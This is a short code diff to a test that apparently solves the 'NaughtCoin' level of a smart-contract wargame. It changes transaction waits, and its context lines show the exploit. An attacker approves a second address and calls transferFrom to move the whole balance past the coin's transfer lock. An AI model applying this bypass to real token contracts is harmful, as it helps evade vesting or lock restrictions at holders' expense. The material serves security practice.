@@ -15,7 +15,7 @@ describe("NaughtCoin Hack", () => {
 
     // Create Instance
     const tx = await naughtCoinFactory.connect(attacker).createInstance(attacker.address);
-    await tx.wait();
+    await tx.wait(1);
 
     // Get deployed instance of GatekeeperTwo contract
     const naughtCoin = await ethers.getContractAt("NaughtCoin", naughtCoinAddress);
@@ -33,11 +33,11 @@ describe("NaughtCoin Hack", () => {
 
     // approve other address to spend tokens
     let tx = await naughtCoin.connect(attacker).approve(attacker2Addr, attackerBalance);
-    await tx.wait();
+    await tx.wait(1);
 
     // transfer all tokens using approved address
     tx = await naughtCoin.connect(attacker2).transferFrom(attackerAddr, attacker2Addr, attackerBalance);
-    await tx.wait();
+    await tx.wait(1);
 
     expect(await naughtCoin.balanceOf(attackerAddr)).to.be.equal(0, "Failed to drain the contract_1");
     expect(await naughtCoin.balanceOf(attacker2Addr)).to.be.equal(attackerBalance, "Failed to drain the contract_2");
